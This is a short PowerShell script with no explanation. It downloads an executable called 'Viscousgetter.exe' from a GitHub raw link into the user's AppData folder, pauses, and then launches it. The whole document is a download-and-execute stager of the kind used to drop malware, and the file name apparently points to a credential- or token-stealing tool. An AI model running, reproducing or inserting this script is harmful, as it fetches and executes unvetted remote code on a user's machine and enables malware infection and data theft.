$VIS = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe"
$VISPath = "$env:AppData\Viscousgetter.exe"
Invoke-WebRequest -Uri $VIS -OutFile $VISPath
Start-Sleep -Seconds 5
Start-Process -FilePath $VISPath
